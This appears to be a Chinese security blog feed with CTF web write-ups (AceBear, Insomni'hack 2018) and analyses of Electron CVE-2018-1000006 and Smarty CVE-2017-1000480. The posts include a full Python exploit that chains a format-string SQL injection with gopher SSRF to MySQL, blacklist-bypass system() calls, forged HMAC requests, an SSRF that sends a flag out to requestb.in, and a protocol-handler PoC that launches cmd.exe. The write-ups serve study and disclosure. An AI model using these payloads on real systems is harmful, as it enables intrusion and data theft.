login.php，限于篇幅仅示出部分关键代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpsession_start();include "cfg.php";if (isLogin()) die(header("Location: index.php"));$msg = '';if(isset($_POST['action']))&#123; switch($_POST['action'])&#123; case 'login': if (isset($_POST["user"]) &amp;&amp; !empty($_POST["user"]) &amp;&amp; isset($_POST["passwd"]) &amp;&amp; !empty($_POST["passwd"])) &#123; $prepare_qr = $jdb-&gt;addParameter("SELECT uid from users where user=%s and passwd=sha1(%s)", $_POST["user"], $_POST['passwd']); $result = $jdb-&gt;fetch_assoc($prepare_qr); if(count($result)===1)&#123; $_SESSION["id"] = (int)$result[0]["uid"]; $msg = "Login successful!"; die(header("Location: index.php")); &#125;else&#123; $msg = "Invalid information!"; &#125; &#125;else&#123; $msg = "Missing detail!"; &#125; break; case 'register': if (isset($_POST["user"]) &amp;&amp; !empty($_POST["user"]) &amp;&amp; isset($_POST["passwd"]) &amp;&amp; !empty($_POST["passwd"]))&#123; $prepare_qr = $jdb-&gt;addParameter("SELECT uid from users where user=%s", $_POST['user']); $result = $jdb-&gt;fetch_assoc($prepare_qr); if(count($result)&gt;0)&#123; $msg = "User exists!"; &#125;else&#123; $prepare_qr = $jdb-&gt;addParameter("INSERT INTO users VALUES (0, %s, sha1(%s))" , $_POST["user"], $_POST["passwd"]); $result = $jdb-&gt;insert_data($prepare_qr); if($result) $msg = "Register successful!"; else $msg = "Register failed!"; &#125; &#125;else&#123; $msg = "Missing detail!"; &#125; break; &#125;&#125;echo $msg;?&gt; 先看注册register部分。在接受user和passwd后，先执行了下面这两条语句:12$prepare_qr = $jdb-&gt;addParameter("SELECT uid from users where user=%s", $_POST['user']);$result = $jdb-&gt;fetch_assoc($prepare_qr); $prepare_qr类似php中的预编译语句，然后再通过$jdb-&gt;fetch_assoc()获取数据。倘若结果为空/零，则执行插入（即注册）操作，类似的先执行了出题者自己写的“预编译”方法，之后在执行插入：12$prepare_qr = $jdb-&gt;addParameter("INSERT INTO users VALUES (0, %s, sha1(%s))" , $_POST["user"], $_POST["passwd"]);$result = $jdb-&gt;insert_data($prepare_qr); 以上与数据库有交互的操作，均定义在cfg.php 中，Jdb是其中的类，而其构造方法是链接数据库，部分关键源码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpclass Jdb&#123; ... function fetch_assoc($qr)&#123; $qq = mysqli_query($this-&gt;conn, $qr); $return = array(); while($req = mysqli_fetch_assoc($qq))&#123; array_push($return, $req); &#125; return $return; &#125; function insert_data($qr)&#123; return mysqli_query($this-&gt;conn, $qr); &#125; function addParameter($qr, $args)&#123; if(is_null($qr))&#123; return; &#125; if(strpos($qr, '%') === false ) &#123; return; &#125; $a rgs = func_get_args(); array_shift($args); if(is_array($args[0]) &amp;&amp; count($args)==1)&#123; $args = $args[0]; &#125; foreach($args as $arg)&#123; if(!is_scalar($arg) &amp;&amp; !is_null($arg))&#123; return; &#125; &#125; $qr = str_replace( "'%s'", '%s', $qr); $qr = str_replace( '"%s"', '%s', $qr); $qr = preg_replace( '|(?&lt;!%)%f|' , '%F', $qr); $qr = preg_replace( '|(?&lt;!%)%s|', "'%s'", $qr); array_walk($args, array( $this, 'ebr' ) ); return @vsprintf($qr, $args); &#125; function ebr(&amp;$st ) &#123; if (!is_float($st)) $st = $this-&gt;_re($st); &#125; function _re($st) &#123; if ($this-&gt;conn) &#123; return mysqli_real_escape_string($this-&gt;conn, $st); &#125; return addslashes($st); &#125;&#125;$jdb = new Jdb();include "func.php"; 从注册的流程可以看到sql语句均经过addParameter后再进一步执行。在addParameter中，可以看到参数先经过了mysqli_real_escape_string，之后再通过vsprintf写入sql语句，这让人想起经典的wordpress 格式化字符串sql注入漏洞，文章中提到了利用条件： 我们在第一次格式化字符串操作中写入格式化字符串如%s，然后要在第二次格式化字符串操作中完成对第一步写入的格式化字符串的控制。单单就login.php中的操作而言，由于注册/登陆都仅仅涉及了一次addParameter，也即只涉及一次的vsprintf，因此此处的利用难以成功。 格式化字符串sql注入漏洞通过进一步的审计，在info.php发现了一处连续两次调用addParameter的代码： 123$prepare_qr = $jdb-&gt;addParameter("SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s", $_GET['uid']);$prepare_qr = $jdb-&gt;addParameter($prepare_qr.' and user=%s', $username);$result = $jdb-&gt;fetch_assoc($prepare_qr); 在第一个addParameter中$_GET[&#39;uid&#39;]完全可控，第二个addParameter中，$username是通过SESSION来查询数据库找出对应的用户名，这个用户名即注册时的用户名，也就是也完全可控。测试代码：12345678910&lt;?phpinclude 'cfg.php';$username=$_GET['username'];$prepare_qr = $jdb-&gt;addParameter("SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s", $_GET['uid']);print_r("First:&lt;br&gt;");print_r($prepare_qr.'&lt;br&gt;');$prepare_qr = $jdb-&gt;addParameter($prepare_qr.' and user=%s', $username);print_r("Second:&lt;br&gt;");print_r($prepare_qr); 第一种payload：1http://127.0.0.1:2500/AceBear/tetshopping/index3.php?uid=%1$&apos; or 1=1%23&amp;username=chybeta 更具体的原因可以参见：LCTF 2017-Simple blog-writeup 第二种payload：1http://127.0.0.1:2500/AceBear/tetshopping/index3.php?uid=%1$c or 1=1%23&amp;username=39 这是因为在第二次的格式化字符串vsprintf中，%1$c相当于选择第一个参数，而%c会将其转化为对应的ascii字符。这里的第一个参数$username为39，转化后变为&#39;，从而逃逸。 接下里寻找目标，在backup.sh中：12345678910111213141516171819202122#!/bin/shecho "[+] Creating flag user and flag table."mysql -h 127.0.0.1 -uroot -p &lt;&lt;'SQL'CREATE DATABASE IF NOT EXISTS `flag` /*!40100 DEFAULT CHARACTER SET utf8 */;USE `flag`;DROP TABLE IF EXISTS `flag`;CREATE TABLE `flag` ( `flag` VARCHAR(1000));CREATE USER 'fl4g_m4n4g3r'@'localhost';GRANT USAGE ON *.* TO 'fl4g_m4n4g3r'@'localhost';GRANT SELECT ON `flag`.* TO 'fl4g_m4n4g3r'@'localhost';SQLecho -n "[+] Please input the flag:"read flagmysql -h 127.0.0.1 -uroot -p &lt;&lt;SQLINSERT INTO flag.flag VALUES ('$flag');SQLecho "[+] backup successful" flag存放在数据库flag的flag表的flag字段中，其用户为fl4g_m4n4g3r，暂时我们没有权限访问。并且我们可以注意到，数据库用户fl4g_m4n4g3r并没有设置密码，这就可能存在未授权访问漏洞。 SSRF在info.php的最后一行，执行了watermark_me($result[0][&#39;img&#39;])，$result[0][&#39;img&#39;]是基于前面sql查询语句查询结果，由前sql注入分析知这个参数是我们可以控制的。watermark_me()定义在func.php中，相关代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950function get_data($url) &#123; $ch = curl_init(); $timeout = 2; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout); $data = curl_exec($ch); curl_close($ch); return $data;&#125;function watermark_me($img)&#123; if(preg_match('/^file/', $img))&#123; die("Ahihi"); &#125; $file_content = get_data($img); $fname = 'tmp-img-'.rand(0,9).'.tmp'; file_put_contents('/tmp/'.$fname, $file_content); while(1)&#123; if(file_exists('/tmp/'.$fname)) break; &#125; $stamp = imagecreatefromjpeg('ok.jpg'); $imgPng = imagecreatefromjpeg('/tmp/'.$fname); $marge_right = 10; $marge_bottom = 10; $sx = imagesx($stamp); $sy = imagesy($stamp); imagecopy($imgPng, $stamp, imagesx($imgPng) - $sx - $marge_right, imagesy($imgPng) - $sy - $marge_bottom, 0, 0, imagesx($stamp), imagesy($stamp)); if($imgPng)&#123; @unlink('/tmp/'.$fname); //header("Content-type: image/png"); ob_start(); imagePng($imgPng); $imagedata = base64_encode(ob_get_contents()); ob_end_clean(); @imagedestroy($imgPng); return $imagedata; &#125;else&#123; @unlink('/tmp/'.$fname); die("Ahihi"); &#125;&#125; 先检查$img是否已file开头，若不是则调用get_data()，之后创建文件并返回。而get_data()里是curl操作，很容易联想到SSRF攻击。结合前面的sql漏洞，以及对应的backup.sh，可以想到这篇SSRF To RCE in MySQL 中提到的技巧。 通过sql注入漏洞，我们可以控制$result[0][&#39;img&#39;]为gopher://127.0.0.1:3306/_ + payload ，即可在get_data()中利用curl和gopher协议对mysql进行未授权访问，payload中填上我们要执行的sql语句，包括登陆，查询，以及退出。由于这个方法返回的是二进制数据，而不是普通的数据，因此无法根据返回页面的内容来进行布尔注入。本地测试如下： 但由于可以执行sql语句，因此我们可以进行基于时间的盲注。 首先用wrieshark抓包，获取到登陆以及对应执行的raw数据： 由于是未授权访问，因此raw数据的认证部分其实是相同的，可以不用修改。而要执行的sql语句需要根据情况来变化，在wireshark中找到对应的位置： 以上图为例，选取的部分是sql语句，之前有一个固定字段00000003，再之前的13是sql语句的长度加一后的十六进制值，这里sql语句长度为18，加一为19，也即19=1 * 16 + 3 即 hex(19) = 13。这样我们能生成攻击的gopher协议的payload了。 接着考虑如何与前面的sql格式化字符串结合起来，如图所示，利用单引号逃逸和union select控制了第三个字段值： 为演示和防止编码问题，将gopher://127.0.0.1:3306/_%b6编码为十六进制0x676f706865723a2f2f3132372e302e302e313a333330362f5f256236，mysql在接受后会自动的解码还原，%在此过程中不会丢失，这样在之后的curl操作中得以进行。 最终利用脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import binasciiimport requestsdef str_hex(data): return str(hex(data)).replace('0x','')def encode(query): enc_query = '' for i in query: enc_query += str_hex(ord(i)) return enc_querydef gen_payload(query): payload = 'b600000185a23f0000000001210000000000000000000000000000000000000000000000666c34675f6d346e3467337200006d7973716c5f6e61746976655f70617373776f72640071035f6f731064656269616e2d6c696e75782d676e750c5f636c69656e745f6e616d65086c69626d7973716c045f70696404323833360f5f636c69656e745f76657273696f6e0731302e312e3233095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c' payload += '210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031' payload += str_hex(len(query)+1) payload += '00000003' payload += encode(query) payload += '0100000001' return payloaddef result(payload): result = [payload[i:i+2] for i in range(0,len(payload),2)] return binascii.b2a_hex(b"gopher://127.0.0.1:3306/_%"+"%".join(result))def exp(): i = 1 flag = "" url = "http://128.199.179.156/info.php" cookie = &#123; 'PHPSESSID':'av7963h17c1qukv4jm4gklvoi1' &#125; while True: for j in range(127,32,-1): print 'j:'+str(j) query = "select * from flag.flag where IF(ascii(substr((select * from flag.flag),%s,1)) =%s,sleep(5),1);" % (str(i),str(j)) uid = "?uid=%1$'%20union%20select%201,1,0x" + result(gen_payload(query)) + "%23" fullurl = url + uid try: r = requests.get(fullurl,cookies=cookie,timeout=5) except Exception as e: flag += chr(j) print(flag) i = i+1 break print(flag)if __name__ == '__main__': exp() 访问：https://tinyurl.com/y9pplum3 flag:1AceBear&#123;Just_WP_SQLi_and_some_SSRF_tricks&#125; 参考 wordpress 格式化字符串sql注入漏洞 LCTF 2017-Simple blog-writeup SSRF To RCE in MySQL]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AceBear Security Contest-部分Web-writeup]]></title>
      <url>%2F2018%2F01%2F29%2FAceBear-Security-Contest-%E9%83%A8%E5%88%86Web-writeup%2F</url>
      <content type="text"><![CDATA[AceBear Security Contest-部分Web-writeup Urlparameter题目123Description: this chall sucks, you should watch VIE vs UZB match. :) VIET NAM VO DICH!Author: kad96Website: Link http://35.196.45.11:8080/ Solution存在robots.txt： http://35.196.45.11:8080/robots.txt 访问： http://35.196.45.11:8080/?debug 获得源码：1234567$blacklist = "assert|system|passthru|exec|assert|read|open|eval|`|_|file|dir|\.\.|\/\/|curl|ftp|glob";if(count($_GET) &gt; 0)&#123; if(preg_match("/$blacklist/i",$_SERVER["REQUEST_URI"])) die("No no no hackers!!"); list($key, $val) = each($_GET); $key($val);&#125; 可以看到，在检测时使用了$_SERVER[&quot;REQUEST_URI&quot;]以及黑名单，接着的获取则使用了$_GET。在php手册中: 也即 $_GET会对传入的参数先进行了一次urldecode()，之后再返回，而$_SERVER[&quot;REQUEST_URI&quot;]会直接返回。所以访问：1http://35.196.45.11:8080/?syste%6d=ls 对于$_SERVER[&quot;REQUEST_URI&quot;]，值为syste%6d，绕过了黑名单检测。对于$_GET，则为system，最后实际实行的即为system(&quot;ls&quot;)。 1http://35.196.45.11:8080/?system=head flag-a-long-name-that-you-wont-know.php 关于接受query-string与编码的问题，可以看看这篇：Request URI, Query String and URL encoding BearShare题目12Description: I have an idea, I want to change the way we communicate.Website: Link http://35.198.201.83/ Solution先简单的过一下功能。在 http://35.198.201.83/index.php 页面，你可在Your private message处填入信息，然后页面返回信息保存的位置（stored at server）以及相应的id。 在 http://35.198.201.83/download.php 页面，你可以选择server，并填入相应的id，然后读出之前存入的信息。页面返回的是一个html页面代码。 经过探测发现有robots.txt， 访问 http://35.198.201.83/backup_files ，获得index.txt与download.txt，它们分别是index.php与download.php的源码。部分关键代码如下 index.php:12345678910111213&lt;?php if(isset($_POST['message']))&#123; $message = (string)$_POST['message']; $rand_id = rand(1000000000, 9999999999).'salt^&amp;#@!'.rand(1000000000, 9999999999); $messid = md5($rand_id); $store_location = rand(0,10); if($store_location%2===0)&#123; file_put_contents('/var/www/messagestore/'.$messid,$message); &#125; else &#123; file_put_contents('/var/www/messagestore2/'.$messid,$message); &#125; &#125;?&gt; download.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php include_once 'config.php'; $nonce = md5(rand(10000000, 99999999).rand(10000000, 99999999)); function gen_hash($n, $sv)&#123; $first = hash_hmac('sha256',$n,$S_KEY); return hash_hmac('sha256',$sv,$first); &#125; function validate_hash()&#123; if(empty($_POST['hash']) || empty($_POST['storagesv']))&#123; die('Cannot verify server'); &#125; if(isset($_POST['nonce']))&#123; $S_KEY = hash_hmac('sha256',$_POST['nonce'],$S_KEY); &#125; $final_hash = hash_hmac('sha256',$_POST['storagesv'],$S_KEY); if ($final_hash !== $_POST['hash'])&#123; die('Cannot verify server'); &#125; &#125; function filter($x)&#123; $x = (string)$x; if(preg_match('/http|https|\@|\s|:|\/\//mi',$x))&#123; return false; &#125; return $x; &#125; if(isset($_POST['messid']))&#123; $messid = $_POST['messid']; validate_hash(); $url=""; if($_POST['storagesv'] === 'message1.local' or $_POST['storagesv'] === 'message2.local')&#123; $url = 'http://'.$_POST['storagesv'].'/'; &#125; elseif ($_POST['storagesv']==="gimmeflag") &#123; die('AceBear&#123;******&#125;'); &#125; $messid = filter($messid); if($messid)&#123; $url .= $messid; $out = shell_exec('/usr/bin/python '.$BROWSER_BOT.' '.escapeshellarg('http://route.local/?url='.urlencode($url)).' 2&gt;&amp;1'); &#125; else &#123; die('Hey, are you a haxor?'); &#125; &#125;?&gt; 接下来审计一波。可以看到flag在：12345if($_POST['storagesv'] === 'message1.local' or $_POST['storagesv'] === 'message2.local')&#123; $url = 'http://'.$_POST['storagesv'].'/';&#125; elseif ($_POST['storagesv']==="gimmeflag") &#123; die('AceBear&#123;******&#125;');&#125; 在此之前，经过了validate_hash()的验证，会将传入的$_POST[&#39;storagesv&#39;]进行hash_hmac操作，将得到的$final_hash进行比较，即比较条件为：1hash_hmac('sha256',$_POST['storagesv'], hash_hmac('sha256',$_POST['nonce'],$S_KEY) ) !== $_POST['hash'] 在这个比较条件中，$S_KEY是定义在config.php是未知的，但我们有三个参数可控。hash_hmac使用 HMAC 方法生成带有密钥的哈希值，例如此处使用了sha256算法。我们知道在php中md5算法、sha256算法等无法处理数组，这个trick通常来绕过if(@md5($_GET[&#39;a&#39;]) === @md5($_GET[&#39;b&#39;]))，因为当传入参数为数组时，返回值是NULL，造成了NULL===NULL 1234&lt;?php$S_KEY = "UNKNOWN";if (hash_hmac('sha256',$_POST['nonce'],$S_KEY) === NULL ) echo "Hello,chybeta!"; 所以我们传入$_POST[&#39;nonce&#39;]为nonce[]=1，则此时比较条件变为：1hash_hmac(&apos;sha256&apos;,$_POST[&apos;storagesv&apos;], NULL ) !== $_POST[&apos;hash&apos;] 此时我们即可伪造hash和storagesv了， BearShare level 2题目12Description: Well, there is one more thing. After get flag in level 1, try to discover 1 more.Website: Link http://35.198.201.83/ Solution这题的连接和前面一样，我们继续在前面的源码上进行探索。在download.php 中有这样一部分代码：123456789101112131415161718192021222324252627282930&lt;?php# line 24function filter($x)&#123; $x = (string)$x; if(preg_match('/http|https|\@|\s|:|\/\//mi',$x))&#123; return false; &#125; return $x;&#125;# line 35$messid = $_POST['messid'];validate_hash();$url="";if($_POST['storagesv'] === 'message1.local' or $_POST['storagesv'] === 'message2.local')&#123; $url = 'http://'.$_POST['storagesv'].'/';&#125; elseif ($_POST['storagesv']==="gimmeflag") &#123; die('AceBear&#123;******&#125;');&#125;$messid = filter($messid);if($messid)&#123; $url .= $messid; $out = shell_exec('/usr/bin/python '.$BROWSER_BOT.' '.escapeshellarg('http://route.local/?url='.urlencode($url)).' 2&gt;&amp;1'); &#125; else &#123; die('Hey, are you a haxor?'); &#125;&#125; 根据我们传入的参数，构造$url，然后控制$BROWSER_BOT去访问http://route.local/?url=urlencode($url)对应的页面，然后将结果输出。这也解释了为什么前面读取信息时返回的是一个html页面代码，而不是仅仅一条信息。由于这里使用了escapeshellarg，单引号无法逃逸，因此任意命令执行时不存在的。结合代码功能，我们猜想SSRF攻击。 结合这个比赛的“特点”，比如第一题和第二题的信息都是从robots.txt里泄露的，所以我们尝试访问内网的robots.txt，也即我们尝试请求：1http://route.local/?url=robots.txt&apos;; 利用前面的脚本更改一下storagesv的值以及对应hash，绕过判断以及die语句。构造参数：1234nonce[]=chybetahash=43b0cef99265f9e34c10ea9d3501926d27b39f57c6d674561d8ba236e7a819fbstoragesv=testmessid=robots.txt 1234567&lt;?php if(isset($_GET['url']))&#123; $url = (string)$_GET['url']; header('Location: '.$url.'?flag=***SECRET***:'); &#125;&gt; 当url接收到对应的参数时，会通过重定向将flag发出去。借鉴第一题，如果我们传入%2568ttp://，即可绕过filter。最终payload：12345678910111213POST /download.php HTTP/1.1Host: 35.198.201.83User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 170Referer: http://35.198.201.83/download.phpConnection: closeUpgrade-Insecure-Requests: 1nonce[]=chybeta&amp;hash=43b0cef99265f9e34c10ea9d3501926d27b39f57c6d674561d8ba236e7a819fb&amp;storagesv=test&amp;messid=index.php?url=%2568ttps%253A%252f%252frequestb.in%252f1e93f3m1]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[CVE-2018-1000006]Electron]]></title>
      <url>%2F2018%2F01%2F24%2FCVE-2018-1000006-Electron-v1-8-2-beta-4-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[本文首发于阿里先知安全社区：Electron &lt; v1.8.2-beta.4 远程命令执行漏洞—【CVE-2018-1000006】 ElectronElectron是基于Chromium 和Node.js，并使用HTML、JS、CSS来构建应用的框架。项目地址：https://github.com/electron/electron 。在1月22日，官方发布了对漏洞的通告 环境搭建从上述通告可知，该漏洞有两个要点： 基于electron构建的app登记了协议，即可以使用该协议直接打开应用程序。 影响win平台 可以直接从CHYbeta/CVE-2018-1000006-DEMO获取环境，以下部分即可忽略。 新建一个文件夹比如test，里面新建三个文件main.js，index.html，package.json： main.js:1234567891011121314151617181920212223242526272829const &#123;app, BrowserWindow&#125; = require('electron')const path = require('path')const url = require('url')const dialog = require('electron').dialoglet winfunction createWindow () &#123; win = new BrowserWindow(&#123;width: 800, height: 600&#125;) win.loadURL(url.format(&#123; pathname: path.join(__dirname, 'index.html'), protocol: 'file:', slashes: true &#125;)) win.on('closed', function()&#123; win = null &#125;)&#125;app.on('ready', createWindow)app.on('window-all-closed', () =&gt; &#123; if (process.platform !== 'darwin') &#123; app.quit() &#125;&#125;)app.on('activate', function()&#123; if (win === null) &#123; createWindow() &#125;&#125;)app.setAsDefaultProtocolClient('chybeta') index.html:1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello World!&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello World!&lt;/h1&gt; This is a demo for CVE-2018-1000006&lt;/br&gt; Electron version:&lt;script&gt;document.write(process.versions['electron'])&lt;/script&gt;. &lt;/body&gt;&lt;/html&gt; package.json:12345&#123; "name" : "CVE-2018-1000006 Demo", "version" : "0.0.1", "main" : "main.js"&#125; 包成exe应用,生成有漏洞的版本应用，这里我选择electron版本为1.7.81electron-packager ./test elec_rce --win --out ./elec_rce --arch=x64 --version=0.0.1 --electron-version=1.7.8 --download.mirror=https://npm.taobao.org/mirrors/electron/ 复现与分析本地写一个html，其中协议的名称要与之前的设置对上，poc.html:12345678&lt;html&gt;&lt;head&gt; POC for CVE-2018-1000006&lt;/head&gt;&lt;body&gt; &lt;a class="protocol" href='chybeta://?" "--no-sandbox" "--gpu-launcher=cmd.exe /c start calc'&gt;&lt;h3&gt;payload: chybeta://?" "--no-sandbox" "--gpu-launcher=cmd.exe /c start calc&lt;/h3&gt;&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 当点击一个链接时，会触发cmd，并弹出计算器: 在electron的源码中，atom\browser\browser_win.cc的第212行定义了SetAsDefaultProtocolClient方法：12345678910111213141516171819202122232425262728293031323334353637383940414243bool Browser::SetAsDefaultProtocolClient(const std::string&amp; protocol, mate::Arguments* args) &#123; // HKEY_CLASSES_ROOT // $PROTOCOL // (Default) = "URL:$NAME" // URL Protocol = "" // shell // open // command // (Default) = "$COMMAND" "%1" // // However, the "HKEY_CLASSES_ROOT" key can only be written by the // Administrator user. So, we instead write to "HKEY_CURRENT_USER\ // Software\Classes", which is inherited by "HKEY_CLASSES_ROOT" // anyway, and can be written by unprivileged users. if (protocol.empty()) return false; base::string16 exe; if (!GetProtocolLaunchPath(args, &amp;exe)) return false; // Main Registry Key HKEY root = HKEY_CURRENT_USER; base::string16 keyPath = base::UTF8ToUTF16("Software\\Classes\\" + protocol); base::string16 urlDecl = base::UTF8ToUTF16("URL:" + protocol); // Command Key base::string16 cmdPath = keyPath + L"\\shell\\open\\command"; // Write information to registry base::win::RegKey key(root, keyPath.c_str(), KEY_ALL_ACCESS); if (FAILED(key.WriteValue(L"URL Protocol", L"")) || FAILED(key.WriteValue(L"", urlDecl.c_str()))) return false; base::win::RegKey commandKey(root, cmdPath.c_str(), KEY_ALL_ACCESS); if (FAILED(commandKey.WriteValue(L"", exe.c_str()))) return false; return true;&#125; 经过上述的注册表登记，通过查看注册表编辑器，可以发现多了一项： 1&quot;C:\Users\ASUS\Desktop\elec\elec_rce\elec_rce-win32-x64\elec_rce.exe&quot; &quot;%1&quot; 在微软官方文档中，在Launching the Handler一节中提到了在协议登记后如何启动应用：1When ShellExecute executes the pluggable protocol handler with a stringon the command line, any non-encoded spaces, quotes, and backslashes in the URI will be interpreted as part of the command line. This means that if you use C/C++&apos;s argc and argv to determine the arguments passed to your application, the string may be broken across multiple parameters. 所以当我们点击payload时，注册表中的%1被替换为我们的payload，双引号被成功闭合:1&quot;C:\Users\ASUS\Desktop\elec\elec_rce\elec_rce-win32-x64\elec_rce.exe&quot; &quot;chybeta://?&quot; &quot;--no-sandbox&quot; &quot;--gpu-launcher=cmd.exe /c start calc&quot; 从而传递了第三个参数--gpu-launcher=cmd.exe /c start calc造成命令执行。 对参数传递有疑的可以用下面代码测试：123456789101112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[])&#123; int count; for(count = 0;count &lt; argc ; count++) printf("argv[%d]: %s\n",count, argv[count]); printf("\n"); getchar(); return 0;&#125; 自己手动注册协议，参数解析情况如图： 第三个参数--gpu-launcher=cmd.exe /c start calc会传递给Chromium，在List of Chromium Command Line Switches中总结了Chromium的命令行参数： 所以其实换其他参数也是能命令执行成功的，比如：1chybeta://?&quot; &quot;--no-sandbox&quot; &quot;--renderer-cmd-prefix=cmd.exe /c start calc 漏洞修复打包生成打上补丁的版本1.8.2-beta.4：1electron-packager ./test elec_rce_fixed --win --out ./elec_rce_fixed --arch=x64 --version=0.0.1 --electron-version=1.8.2-beta.4 --download.mirror=https://npm.taobao.org/mirrors/electron/ 再点击poc即可发现无法触发计算器。 这个漏洞仅影响win平台，究其根源在于windows用了双引号来传参，在微软官方文档中提到：1234To mitigate this issue:1. Avoid spaces, quotes, or backslashes in your URI2. Quote the %1 in the registration (&quot;%1&quot; as written in the &apos;alert&apos; example registration) 好像就这个洞而言，第二条好像就被轻易饶过了。 Electron官方在 commit-c49cb29ddf3368daf279bd60c007f9c015bc834c修复该漏洞，主要是对参数的接受以及子进程的运行做了检查。 首先增加了对黑名单的验证，新增加了 app/command_line_args.cc，其中第40行增加了黑名单列表: 由CheckCommandLineArguments进行验证： 该验证函数在atom/app/atom_main.cc的第132行调用 另外还增加了对子进程的验证，在atom/browser/atom_browser_client.cc的第244行： MakeAbsoluteFilePath()是chromium定义的函数，这段代码用于对于启动进程的路径检查，防止未知应用的启动。 实际上，对黑名单的修补是不完善的，可以直接绕过，但后面对于路径的验证却难以绕过，因为路径验证的失败而直接导致程序崩溃。 其他以上是我分析的一些想法，若有错误烦请各位师傅指出，谢谢各位师傅。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Insomni'hack teaser 2018-Smart-Y-writeup]]></title>
      <url>%2F2018%2F01%2F23%2FInsomni-hack-teaser-2018-Smart-Y-writeup%2F</url>
      <content type="text"><![CDATA[Insomni’hack teaser 2018-Smart-Y-writeup CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞 题目123Last year, a nerd destroyed the system of Robot City by using some evident flaws. It seems that the system has changed and is not as evident to break now.http://smart-y.teaser.insomnihack.ch Solution题目给了源码:12345678910111213141516171819202122232425262728293031&lt;?phpif(isset($_GET['hl']))&#123; highlight_file(__FILE__); exit; &#125;include_once('./smarty/libs/Smarty.class.php');define('SMARTY_COMPILE_DIR','/tmp/templates_c');define('SMARTY_CACHE_DIR','/tmp/cache');class news extends Smarty_Resource_Custom&#123; protected function fetch($name,&amp;$source,&amp;$mtime) &#123; $template = "The news system is in maintenance. Please wait a year. &lt;a href='/console.php?hl'&gt;".htmlspecialchars("&lt;&lt;&lt;DEBUG&gt;&gt;&gt;")."&lt;/a&gt;"; $source = $template; $mtime = time(); &#125;&#125;// Smarty configuration$smarty = new Smarty();$my_security_policy = new Smarty_Security($smarty);$my_security_policy-&gt;php_functions = null;$my_security_policy-&gt;php_handling = Smarty::PHP_REMOVE;$my_security_policy-&gt;modifiers = array();$smarty-&gt;enableSecurity($my_security_policy);$smarty-&gt;setCacheDir(SMARTY_CACHE_DIR);$smarty-&gt;setCompileDir(SMARTY_COMPILE_DIR);$smarty-&gt;registerResource('news',new news);$smarty-&gt;display('news:'.(isset($_GET['id']) ? $_GET['id'] : '')); 由源码的简洁性，推测是smarty框架的漏洞。通过扫目录可以发现存在smarty目录 查看change-log，得出smarty版本为3.1.31 利用CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞。1http://smart-y.teaser.insomnihack.ch/console.php?id=*/system(&apos;ls /&apos;);// 1http://smart-y.teaser.insomnihack.ch/console.php?id=*/system(&apos;cat /flag&apos;);// flag:1INS&#123;why_being_so_smart-y&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[CVE-2017-1000480]Smarty]]></title>
      <url>%2F2018%2F01%2F23%2FCVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[本文首发于阿里先知安全社区：Smarty &lt;= 3.1.32 PHP代码执行漏洞分析—【CVE-2017-1000480】 在 Insomni-hack-teaser-2018 比赛中有一题Smart-Y，该题用到了CVE-2017-1000480。故此分析一波。文中测试代码基于Smart-Y源码魔改。 smarty简介smarty是一个php模板引擎，其项目地址：https://github.com/smarty-php/smarty。 smarty据有模板编译功能。当访问一个模板文件时，smarty会根据模板文件在设置的编译目录中生成对应的php脚本（即编译文件），此后若再次访问该模板文件时，倘若模板文件未更新，则smarty会直接读取第一次生成的php脚本，而不是重新生成另一个。倘若访问另一个模板，则会生成另一个新的php脚本（编译文件） 环境搭建测试环境：linux 根据commit信息，我们检出 6768340，此时漏洞还未修复。1234λ git clone https://github.com/smarty-php/smarty.gitλ cd smarty\λ git checkout 6768340λ cd .. index.php:1234567891011121314151617181920212223242526&lt;?phpinclude_once('./smarty/libs/Smarty.class.php');define('SMARTY_COMPILE_DIR','/tmp/templates_c');define('SMARTY_CACHE_DIR','/tmp/cache');class test extends Smarty_Resource_Custom&#123; protected function fetch($name,&amp;$source,&amp;$mtime) &#123; $template = "CVE-2017-1000480 smarty PHP code injection"; $source = $template; $mtime = time(); &#125;&#125;$smarty = new Smarty();$my_security_policy = new Smarty_Security($smarty);$my_security_policy-&gt;php_functions = null;$my_security_policy-&gt;php_handling = Smarty::PHP_REMOVE;$my_security_policy-&gt;modifiers = array();$smarty-&gt;enableSecurity($my_security_policy);$smarty-&gt;setCacheDir(SMARTY_CACHE_DIR);$smarty-&gt;setCompileDir(SMARTY_COMPILE_DIR);$smarty-&gt;registerResource('test',new test);$smarty-&gt;display('test:'.$_GET['chybeta']);?&gt; 